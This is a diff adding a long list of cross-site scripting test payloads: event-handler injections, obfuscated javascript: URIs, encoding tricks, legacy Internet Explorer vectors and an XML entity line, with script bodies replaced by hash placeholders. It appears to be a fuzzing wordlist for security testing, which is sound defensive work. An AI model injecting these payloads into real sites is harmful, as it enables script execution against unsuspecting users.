@@ -1,0 +1,558 @@
+&#00;</form><input type&#61;"date" onfocus="alert(0a0f807069304eca34f0e68597a51e69)">
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(ce7adb109a2a6a461b7db5fcfbf60780)>OnMouseOver
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:87069c31ba0ed8c759d6d194a589231d strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:f593c10d217c35f2e762958b85f2136f strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=da03cf976c07297a8b66f9947a05880c&gt;>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:07440c8f72c964c6f6ada7a8e441cdf3&gt;>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=c930cfd332372a4dcd5cf64b7fe126d5&gt;`>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:b39b673369c3075005fb8c2d65f718a5&gt;`>
+&#34;&#62;<h1/onmouseover='\u0061lert(b61e68a0ef15550228b7a405fada3000)'>%00
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(a9baf7e7039dc3d52d028f655ba778aa)>'
+<673ec66192f233c2063b9c60ede2d8e6 STYLE="x:expression(javascript:673ec66192f233c2063b9c60ede2d8e6)">
+<7887b6def7749cab651cde6db8985623 STYLE="xss:expression(7887b6def7749cab651cde6db8985623)">
+--- ";7a02064692801f25ba6d271d37bfd535;//
+";94865bd21a9ee05378b1a72216dd7f7d//
+<!-- -- -->9c40895cbc5e056d6a2745f67162c155<!-- -- -->
+'';!--"<a5b63245b37182706f3d42afba5d92b6>=&{()}"
+">a92d3b2fa13abeb78e6b660de63118b9
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(4abb66c8f7b114721836be2c95dca15a)>ClickMe
++ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),59801122cf4ebc5c49cdb3b14b5e59fc;
+a="get";b="URL("";c="javascript:";d="b1e0c54ac9dc6bef1fd0c1ffe6cbe30a")";eval(a+b+c+d);
+<a href="about:c035be9ff090ce8b60a2316e3dae8949">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=7a413e6a2f1e2da55f351d8883d9d49a></a>">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:c9ed35ef3461ae660060e43c7c309cd1></a>">
+<a href="jav&#65ascript:ca2080ff6c4de737ea0d7d42041a38f1">X1</a>
+<a href="jav&#65ascript:javascript:8ca57dc549bcdc39dd4eb7da9119d23d">X</a>
+<a href="jav&#97ascript:08811dc728cf40aabc3035ff86cd0017">X1</a>
+<a href="jav&#97ascript:javascript:1f8cf6d12e3c007998ed4af38f42de4f">X</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:1cdc40fd0bf2f33057860ddb49a09840>XXX</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:41111c92dbb8b6e2ab03f271c57f872e>XXX</a>
+<a/href="javascript:&#13; javascript:prompt(27b9d50b29c43c50e1f8658de93ba162)"><input type="X">
+<a href="javascript#63d3bdc2e9011a625ccf7b970c714951">
+<a href="javascript:7b7e6a06bcd691a6ac06419204d20de6"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="jAvAsCrIpT&colon;alert&lpar;976e88b5172d9fdd357c0902ab03c663&rpar;">X</a>
+<a href="javascript:javascript:53987e554999849628c42407aab841bf"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:X%0A%0A">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:659fd2c53e392704e7b8458514395516&NewLine;>X</a>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(d14290b9f8f5570b54a6e0a22475e99d)&NewLine;>X</a>
+<a onmouseover=e5dc9c171208934ffce9421b0996367a>X</a>
+<a onmouseover="fb23fcf9727d15f11103fecc58efe1e3">X</a>
+<applet onerror applet onerror="javascript:791400becc18ba792633ada9573865b3"></applet onerror>
+<applet onError applet onError="javascript:96cbb65a02c8c712b89e09ef24c1e5c8"></applet onError>
+<applet onerror applet onerror="javascript:javascript:cc8722318c3187136c3859b61f8253b8"></applet onerror>
+<applet onError applet onError="javascript:javascript:ce4588522e811cbd6f64f4ef10ae42fd"></applet onError>
+<applet onReadyStateChange applet onReadyStateChange="javascript:14408e0f7deafef1df31444589cbbec7"></applet onReadyStateChange>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:791f2219cc0b28735eb5202e18f1626c"></applet onreadystatechange>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:85fa1efec5cd7393fc5b36b4f32748a1"></applet onReadyStateChange>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:1acfbf82f3873ec76f9eb1013e604337">XXX</a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:145f932f62e3d4502af96c5660eb984b">X</a>
+<a style="-o-link:'javascript:a08b5a89eef109014ff6ef0674312ab9';-o-link-source:current">X
+<a style="-o-link:'javascript:javascript:3a4bbfc63887e56a532c6e653ee13883';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="60b077bc2cc6503c6626669cb272da3f;">XXX</a></a><a href="javascript:60b077bc2cc6503c6626669cb272da3f">XXX</a>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:ee305298f2b779aee18f61ffbe4ac41c;">X</a></a><a href="javascript:javascript:ee305298f2b779aee18f61ffbe4ac41c">X</a>
+<audio src=1 href=1 onerror="c890a8893c0e6706b23e6f708da9dba0"></audio>
+<audio src=1 href=1 onerror="javascript:d625cb52cc59935c1547093f6d62eaf3"></audio>
+<BASE HREF="b67dad312daf482d25d641de9709f047//">
+<BASE HREF="javascript:a767ad9da70d3e42fb816abdde2bd03e;//">
+<BASE HREF="javascript:javascript:a76b26627b046149fbd92ae07105956d;//">
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:5c003d5dcb65b106e38fb491afab4cfe"></bgsound onPropertyChange>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:e89c4827c062cc33676fb49d5881a08f"></bgsound onPropertyChange>
+<BGSOUND SRC="cd3547a345e04689eee6986a4dffd2c9">
+<BGSOUND SRC="javascript:javascript:be50e080b0cb907c895fac0a7bc3b785;">
+<BODY BACKGROUND="cab33579e4969b4f0fdc21444671cffc">
+<body onBeforeUnload body onBeforeUnload="javascript:86961ef779c69b2f155666093859d10b"></body onBeforeUnload>
+<body onbeforeunload body onbeforeunload="javascript:bde01ab38bb8e8252cf61d21d694609d"></body onbeforeunload>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:0f6d728615bc4496a386fde5dfddac2d"></body onBeforeUnload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:37b73d13d5c1ff2b1219dc2e2e4347d2"></body onbeforeunload>
+<body onblur body onblur="javascript:1600d3af7a7e19897b0776e845f70ffb"></body onblur>
+<body onblur body onblur="javascript:javascript:6d2307afb9bb6e3641474d9a19c3317e"></body onblur>
+<body onFocus body onFocus="javascript:2e2338cd6b6d0ddb99e505bd40d199e6"></body onFocus>
+<body onfocus body onfocus="javascript:45240f5700138ca626b1bd3a5bc91abf"></body onfocus>
+<body onFocus body onFocus="javascript:javascript:46d14e09124d0343b1afee7075a1980b"></body onFocus>
+<body onfocus body onfocus="javascript:javascript:eaa6ba292bedf7ddcdcf2cac98c13c6a"></body onfocus>
+<body oninput=82ca86d0710dfa03ad69716429ac1154><input autofocus>
+<body oninput=javascript:78025601311f9ca13e124b9158c927dd><input autofocus>
+<body onkeydown body onkeydown="javascript:a365c004e3b6cd034132d7603ecf6ff6"></body onkeydown>
+<body onkeydown body onkeydown="javascript:javascript:a8470aa552bd9867670abddc08b9a171"></body onkeydown>
+<body onkeyup body onkeyup="javascript:58664d7525f5516f05cca53a5ed653e5"></body onkeyup>
+<body onkeyup body onkeyup="javascript:javascript:344ae195985f853b819585377b46e597"></body onkeyup>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=768e605460ae2b83a40714a6b8df4eeb>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=7a912d0e8c3b11753ae33e1b6ddadbac>
+<BODY ONLOAD=b4e0a588e6163654e244d041d241890c>
+<body onLoad body onLoad="javascript:3ce3d5d3c08b56f4809a4e0881920b9a"></body onLoad>
+<body onload body onload="javascript:99e92b2283b4b66d26a2a5161703fb07"></body onload>
+<body onload body onload="javascript:javascript:26bcf78c39d11275f0eb3aad2130a8b7"></body onload>
+<body onLoad body onLoad="javascript:javascript:5fa38bcabe26d7fd817ca106aa1c43ee"></body onLoad>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:86e8541826dfabb985178cbed76f85fe>
+<BODY ONLOAD=javascript:javascript:ab2463286e8e534ef7c4e2a528081cbc>
+<body/onload=&lt;!--&gt;&#1022d1e81188634254d827875028f351aa>
+<body/onload=&lt;!--&gt;&#10alert(dab12047d85be916faa3e733515cf255)>
+<body onMouseEnter body onMouseEnter="javascript:048671668db167f784be529117944b54"></body onMouseEnter>
+<body onMouseEnter body onMouseEnter="javascript:javascript:ab2bb379db76a612279f759b8b7f0883"></body onMouseEnter>
+<body onMouseMove body onMouseMove="javascript:eda917aef62d45201d013e8939739e0a"></body onMouseMove>
+<body onMouseMove body onMouseMove="javascript:javascript:57a253bd0908eddc63af54542f42d6b6"></body onMouseMove>
+<body onMouseOver body onMouseOver="javascript:eb5b3d487527b493b347950ded6d00ef"></body onMouseOver>
+<body onMouseOver body onMouseOver="javascript:javascript:a07718788c903a3980c3984409cfaa33"></body onMouseOver>
+<body onPageHide body onPageHide="javascript:0a961db3594c5fd860a64af41e40dc6e"></body onPageHide>
+<body onPageHide body onPageHide="javascript:javascript:61884c10a6e01f8e566b716b6e153f6f"></body onPageHide>
+<body onpagehide body onpagehide="javascript:javascript:e26ccf0718d870f2d1bb4276c45f316a"></body onpagehide>
+<body onPageShow body onPageShow="javascript:400da9ce3979bf5911878fd78a29a188"></body onPageShow>
+<body onPageShow body onPageShow="javascript:javascript:ccb0917b221dc5e6cae12d323c30a809"></body onPageShow>
+<body onPopState body onPopState="javascript:cd03ea256dc1b3e0af582f334c466453"></body onPopState>
+<body onPopState body onPopState="javascript:javascript:2d3803d17e096741c3c7bfdd6e170bc6"></body onPopState>
+<body onPropertyChange body onPropertyChange="javascript:05b4ac9db5c78d84e9b1d6c7ffa73ecf"></body onPropertyChange>
+<body onPropertyChange body onPropertyChange="javascript:javascript:93aa41a09536483c2be82102b1987317"></body onPropertyChange>
+<body onResize body onResize="javascript:37600467053c0008191fd4d496203e0b"></body onResize>
+<body onResize body onResize="javascript:javascript:2bfcd3008e857dd5c3d4f47356de35cf"></body onResize>
+<body onscroll=59f613beffae6f86ba90dba39e84aa66><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onscroll=8b773f92735a8f9bffc6f578c4dee2de><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:2e8f4fdcc8ec58e93d64a40aaffbe3f9><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:bea70854f6edf37e9780ce6acf5cf8f1><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onunload body onunload="javascript:a22946fd68a0c1c9767d20aff4813277"></body onunload>
+<body onUnload body onUnload="javascript:fd5445795f34c2f52837763c1fd54dca"></body onUnload>
+<body onunload body onunload="javascript:javascript:02354bd1f1f973f59e66eadd17af0b50"></body onunload>
+<body onUnload body onUnload="javascript:javascript:91b8e636ee207cab3d1a647775802a87"></body onUnload>
+<body src=1 href=1 onerror="26b26f36989cc0839a094c8f6e3341d8"></body>
+<body src=1 href=1 onerror="javascript:fa9180b3a9816baa9dadc99d25b5eb35"></body>
+<BR SIZE="&{9efb33fcdeebab93a2124c1ed44ddc86}">
+<BR SIZE="&{javascript:f2aa8bddc592ad049abdc772fcfa1dd5}">
+<b <script>67aecdfc9f6fed99a9b42a228096801d</script>0
+<b <script>alert(3afe04a54aa8922a934ea1cd8591c4e4)</script>0
+<b><script<b></b><1037fa56a7e218432b698a50eb09e9e7</script </b>
+<card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:415246a50178bcc04d45589113ccec30"/></onevent><timer value="1"/></card>
+![CDATA[<!--]]<SCRIPT>915916cf0edb7f76396a84b6e60a4d83//--></SCRIPT>
+<comment><img src="</comment><img src=x onerror=c0ee5266785b7e74132c2e27faf17cb9)//">
+<comment><img src="</comment><img src=x onerror=javascript:38f679fedb4982d1fa533dcfed7740a7)//">
+<div datafld="b" dataformatas="html" datasrc="#48ce7f5c1302f4ff4fb079f329ec0966"></div>
+<div id="div1"><input value="``onmouseover=7ba12a7ff48b401bbd3babc146ce5b45"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div id="div1"><input value="``onmouseover=javascript:77d3ca94f60b8d053f95b5d45ddeab32"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div id=d><x xmlns="><iframe onload=87669511b5b0f3db2b85a83f32bccc56"></div> <script>d.innerHTML=d.innerHTML</script>
+<div id=d><x xmlns="><iframe onload=javascript:0a030807cf0ca7c7ba5c080b2a1e165a"></div> <script>d.innerHTML=d.innerHTML</script>
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=7c4bd6ae2f11821716fccadba1432905&gt;">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:c92a8ad2e42f80602ed3acdbb9edf3d7&gt;">
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:efb20ed636fb3de89f6c476b68cc67a2&gt;">
+<div/onmouseover='245eca30d734434f6f585ad464016216'> style="x:">
+<div/onmouseover='alert(e1423fef6fe743eb797466c38da58974)'> style='x:'>
+<div onmouseover='alert&lpar;7f3802001e036dc96657cb5141ff378d&rpar;'>DIV</div>
+<DIV STYLE="background-image: url(&#1;496fc39ffd1e7eb51485747b47eb3d3c)">
+<DIV STYLE="background-image: url(&#1;javascript:90b1100d6316493335711687656c5f96">
+<DIV STYLE="background-image: url(4982b87e582e92f238bb76b44e01918d);">
+<DIV STYLE="background-image: url(javascript:javascript:72f9f685bbdaf4795495d3d48905e42d)">
+<DIV STYLE="behaviour: url(df3e154d758ea7bba5235ed51730c8f4);">
+<DIV STYLE="binding: url(javascript:6b625b3667775a2ed2ef74dca2ae4097);">
+<div style="list-style:url(http://foo.f)url(javascript:javascript:f879698bd885a0f2cd17ba57b7283f38);">X
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="f051b9a94f113b96b90eaf9d78eb0d71">x</button>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(e3c2e0f2a24dc6470cd5e0d9dc5e2fec)" onclick="alert(e3c2e0f2a24dc6470cd5e0d9dc5e2fec)">x</button>
+<div style=width:1px;filter:glow onfilterchange=1ac914bba3497d795c7a6dde576dd06b>x
+<div style=width:1px;filter:glow onfilterchange=javascript:67ef8ca7a33ce85ea6ff500945ee6261>x
+<DIV STYLE="width: expression(1439fc825fc6e636ba8ec78d023f8ebe);">
+<DIV STYLE="width: expression(4ee5faf8169e4877d34ddf58bf1d1469);">
+<div/style="width:expression(confirm(4b6e6c0b7ccde0b30891c591a4e776b6))">X</div>
+<DIV STYLE="width:expression(javascript:b430449b2074e43b5da3aaa8861d1af8);">
+<!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "cf666a052bceeb1c96de83bcf36f9ea2"> ]><img /><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml"> <html:style /><x xlink:href="javascript:cf666a052bceeb1c96de83bcf36f9ea2" xlink:type="simple">XXX</x> </doc>
+<!DOCTYPE x[<!ENTITY x SYSTEM "1e954052e9b1439f065212e372295fcb">]><y>&x;</y>
+&e0401f9d27eb661907cc2b6ce0ae28e8">
+<? echo('<SCR)';echo('IPT>165f294b0caa702d30dabc919160c050</SCRIPT>'); ?>
+&{ee4865081c186b3d2dc906b8d2394b31};
+<embed code="efb10f84cd7b931a3149633ba0c7e188" allowscriptaccess=always>
+<embed code=javascript:76406256ad022e881e2f03023e57f0e4;></embed>
+<embed code=javascript:javascript:e147d7f91dab8a8e3016126a403b4d8d></embed>
+<embed src="ea0edae407814b6fff60f8d85ac58939">
+<embed src="javascript:a715242acacd3cbc36bafca007151759">
+<embed type="image" src=40c7736d901bd3e597d517e535d716ba></embed>
+<embed width=500 height=500 code="data:text/html,<script>2e801f7e8f54b9ad280d1d43c2f0f2a1</script>"></embed>
+<event-source src="b28121dcc37aa939a23f04913a2da3c7" onload="b28121dcc37aa939a23f04913a2da3c7">
+<event-source src="%(event)s" onload="javascript:40ac946bd938b4558ef44ad6de1353c7">
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(8d9a178e074af284d371f21ad7557eb1)>'</font>/</style>
+<! foo="[[[Inception]]"><x foo="]foo><script>a11ddb47446f067e0faa5562ad2cca4b</script>">
+<! foo="[[[Inception]]"><x foo="]foo><script>javascript:ca4b5188c16f25d81a712722f2d6cad2</script>">
+<? foo="><script>459ddbe0d338a979df472fec2e355fbd</script>">
+<! foo="><script>48f0cc1b0da385638d1973f8cf4b4bdb</script>">
+</ foo="><script>61ec2a30b849d9ac908511f463b16637</script>">
+<? foo="><script>javascript:166a2a39f5a58dbfd5baa4a0be7391c0</script>">
+</ foo="><script>javascript:2268608b68e5953f99493a7a13b79b9e</script>">
+<! foo="><script>javascript:a2da7f34c86440135e7552b49aad16b4</script>">
+<% foo><x foo="%><script>2b20217b65dacf0e855fedc08c59cd8a</script>">
+<? foo="><x foo="?><script>f6d44b68b66d2b3bb099d94d233ab898</script>">">
+<? foo="><x foo='?><script>javascript:2c0be85b672d2237f685f6b3fae6833f</script>'>">
+<% foo><x foo="%><script>javascript:4655b6f896593578943cdfd4fb2892e4</script>">
+<form><button formaction=javascript&colon;af464c3ed855574beea7d14140e74f70>X
+<form><button formaction=javascript&colon;alert(b3b82ad4d88e454766f1e3d3583a9b11)>CLICKME
+<form><button formaction="javascript:f6cdfcefa14696934a0ce1e7a441daaa">X
+<form><button formaction="javascript:javascript:2dafc4a88db63cd78bcade9f94615b77">X
+<form id="test" /><button form="test" formaction="javascript:0ae1648d4f7f9d5ea813656a560e6fe2">X
+<form id="test" /><button form="test" formaction="javascript:javascript:2cdd752fe64a0a9865e28903d58632c3">X
+<form id=test onforminput=javascript:b0f141268120bd7e2d8c11c038027535><input></form><button form=test onformchange=javascript:b0f141268120bd7e2d8c11c038027535>X
+<form id="X" /><button form="X" formaction="javascript:e6862819f8b951ea6a0dec9ed2a3a952">X
+<form id=X onforminput=3ce2e54deb8c013d46e1dd7b0f0eb4d0><input></form><button form=X onformchange=3ce2e54deb8c013d46e1dd7b0f0eb4d0>X
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(af8d132cc57e812a44be11ff628d860a)"&#11;&#10;&#09;;>
+<form><isindex formaction="javascript&colon;confirm(8c58be8f092df6fda8c4cb34b67835cb)"
+<form><textarea &#13; onkeyup='0ecc93366da3d6fdff687bfb3f3e93e2'>
+<FRAMESET><FRAME SRC="4c8689e17b23a15a98bfe3419b20dd0f"></FRAMESET>
+<FRAMESET><FRAME SRC="javascript:javascript:b99b60195d77648a72bb41d2a70ea7d7;"></FRAMESET>
+<frameset onBlur frameset onBlur="javascript:8df5bd4abd5fca1291f9f640cc339264"></frameset onBlur>
+<frameset onBlur frameset onBlur="javascript:javascript:87f21ffd953f066dcd101ad9d7bc46bf"></frameset onBlur>
+<frameset onFocus frameset onFocus="javascript:22fc719b4a0b8930cbad3d7ec6c6f559"></frameset onFocus>
+<frameset onFocus frameset onFocus="javascript:javascript:83dda7f937fafca60a7c75feaaf6b756"></frameset onFocus>
+<frameset onload=dfa2d3808df48da2b0d49b6b5601eb1d>
+<frameset onload=javascript:bf53f1b0d44019d92ea56f90fc1e95db></frameset>
+<frameset onload=javascript:c6d56281393b15a259d525578d48ec87>
+<frameset onload=javascript:javascript:d77a824f1e3092f1716f6404555c0e82></frameset>
+<frameset onScroll frameset onScroll="javascript:22a1132c619bef0bf8b7edab092f7888"></frameset onScroll>
+<frameset onScroll frameset onScroll="javascript:javascript:c1b478f5bcb649ba12c7cfbadedc148f"></frameset onScroll>
+<head><base href="javascript://"></head><body><a href="/. /,4ed73d93564ef39005a9028420e2d322//#">XXX</a></body>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:5b2d78dc33bbd37904f5181835a60449//#">X</a></body>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-7fa256c1f7026efa34846d4475532769+ADw-/SCRIPT+AD4-
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="b417bc5016d3561dcfe48929b951af18&lt;SCRIPT DEFER&gt;javascript:b417bc5016d3561dcfe48929b951af18&lt;/SCRIPT&gt;"></BODY></HTML>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;03becb59791a0656af23ea5459afc51a&lt;/SCRIPT&gt;"></BODY></HTML>
+<html onMouseDown html onMouseDown="javascript:175b7015c3b0c916de5264fe32a0b76e"></html onMouseDown>
+<html onMouseDown html onMouseDown="javascript:javascript:b02794a4993235048aa316685daa1df0"></html onMouseDown>
+<html onMouseEnter html onMouseEnter="javascript:parent.076bbe2bce355ae40ce3f4df4701b06c"></html onMouseEnter>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:5a9895d481d21d44f9b566bb1a20b041"></html onMouseEnter>
+<html onMouseLeave html onMouseLeave="javascript:ccc1c4d4fb27aeb6c72d8d2c2e165a8d"></html onMouseLeave>
+<html onMouseLeave html onMouseLeave="javascript:javascript:b9ded0ce88320c839363d7600ecc39b6"></html onMouseLeave>
+<html onMouseMove html onMouseMove="javascript:f78b9088db3ec2e0b41665caac0fd04b"></html onMouseMove>
+<html onMouseMove html onMouseMove="javascript:javascript:49d136a9ee21b4da28fc7cd8fb052267"></html onMouseMove>
+<html onmousemove html onmousemove="javascript:javascript:fa31a847888f8f3fdac4bdc4f148dc9b"></html onmousemove>
+<html onMouseOut html onMouseOut="javascript:4b3c510144cd53d0f8d607ea2c03f98e"></html onMouseOut>
+<html onMouseOut html onMouseOut="javascript:javascript:506d760af80ff6cb6a78130e79909e85"></html onMouseOut>
+<html onmouseover html onmouseover="javascript:17e471351ef0accc6a2203e87886b6ef"></html onmouseover>
+<html onMouseOver html onMouseOver="javascript:2e3e9cefc719858aaeef91e8bc56c173"></html onMouseOver>
+<html onMouseOver html onMouseOver="javascript:javascript:426a73f01ac518e419c6048e68107fa6"></html onMouseOver>
+<html onmouseover html onmouseover="javascript:javascript:82c20d293a841ed483e0b5de2caba7c7"></html onmouseover>
+<html onMouseUp html onMouseUp="javascript:6ce2412f56d2b6f78ed92be6a68f18d0"></html onMouseUp>
+<html onMouseUp html onMouseUp="javascript:javascript:484a603658f3d267098dac4fdc70af02"></html onMouseUp>
+<html onMouseWheel html onMouseWheel="javascript:a299c4b9d91f0d8a6ab1069227b33d7e"></html onMouseWheel>
+<html onMouseWheel html onMouseWheel="javascript:javascript:2bb425b2c438b526667284b82af43f31"></html onMouseWheel>
+<HTML xmlns:x><?import namespace="x" implementation="%(htc)s"><x:x>491391cba076ab631848dfaa80e1f47a</x:x></HTML>""","XML namespace."),("""<XML ID="x"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:491391cba076ab631848dfaa80e1f47a"&gt;</B></I></XML><SPAN DATASRC="#x" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML xmlns:X><?import namespace="X" implementation="%(htc)s"><X:X>X</X:X></HTML>""","XML namespace."),("""<XML ID="X"><I><B>&lt;IMG SRC="javas<!-- -->cript:298aa2e02cd58acf51ca83b601d2df15"&gt;</B></I></XML><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+http://www.google<script .com>alert(b8b14da0bf5f4c222fc65c2e7be0fa3f)</script
+http://www.<script>18e912d85448419813c8944f339577d9</script .com
+http://www.<script>alert(13fae47c11b39f01b3d03e320f77f3a6)</script .com
+<!--[if gte IE 4]>25af0cd4276dc2ff6c73705fb34cd884<![endif]-->
+<!--[if<img src=x onerror=e1d836fd7177037eccfb58ca34336e15//]> -->
+<!--[if<img src=x onerror=javascript:d812827166c7612991605aee088f5016//]> -->
+<iframe/%00/ src=javaSCRIPT&colon;84538b2123b335e344e43370b32935b3
+<iframe/%00/ src=javaSCRIPT&colon;alert(92e30f35a4915ebfa9af58043b9c16c3)
+<iframe %00 src="&Tab;javascript:prompt(f8fcc69af82abe00a17a8d101cbcaee0)&Tab;"%00>
+<iframe onbeforeload iframe onbeforeload="javascript:47ad257989d5fbd865a814b783f32bb5"></iframe onbeforeload>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:473eb8513c7c0e505f2b8abad25747e7"></iframe onbeforeload>
+<iframe/ "onload=0e56246ddcbe115d86f25772cf590e78></iframe>
+<iframe///////onload=6bde5932a29c7f0b3e7e46f5599b7b91></iframe>
+<iframe "onload=d7a61f5c8ee26b2857e76afe559001c8></iframe>
+<iframe/ /onload=e464f84b02aebb030e21c78c8b6c5947></iframe>
+<iframe onLoad iframe onLoad="javascript:76000ca033b6742ea9f25706e05cbd14"></iframe onLoad>
+<iframe onload iframe onload="javascript:9724b8999f11976087aea84295c17040"></iframe onload>
+<iframe onLoad iframe onLoad="javascript:javascript:50eada33b87de0b3828f1dcbdecaba71"></iframe onLoad>
+<iframe onload iframe onload="javascript:javascript:74afb2776490737733e61b4407b5c3d8"></iframe onload>
+<iframe/onreadystatechange=1182b73d10fb8b720c0e7078b0ee3f58
+<iframe/onreadystatechange=alert(516bb939af73387a235c0383999df9ff)
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:a98dba655d261ca0179d68cb641a167c"></iframe onReadyStateChange>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:a27882435a4965add1d080f5673b0c4a"></iframe onReadyStateChange>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('ee0a280d94beacc2892c1f2e4a4c0302')>
+<iframe<?php echo chr(11)?> onload=3205ccd12c80ff33479d9b24681cd96d></iframe>
+<iframe<?php echo chr(12)?> onload=5db5a4b464f7bf67729a85f38159d1aa></iframe>
+<iframe src=71084bdeefea2e6eaea4993ac5f9a379 <
+<IFRAME SRC="71205e74677bb3ed2b8a830dcb755f17"></IFRAME>
+<iframe/src="data:text/html,<svg &#111;&#110;load=85989665ec642dd0af74cf5a9d50966b>">
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(7b8a9a1aef06859e9e3f10679b12bc12)>">
+<iframe srcdoc='&lt;body onload=prompt&lpar;aeeb882f1d5c33c00fcfeefd89f955bc&rpar;&gt;'>
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=accd22c6101f544196914c6fae311b33&amp;gt;>">
+<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:c2be339b23562dc3c466a50d6dca841f&amp;gt;>">
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1995e026638cb82bce3adc5bf54eba6c) /*iframe/src*/>
+<iframe src iframe src="javascript:97c0c1c7b8fba97a3f932b39c77734bc"></iframe src>
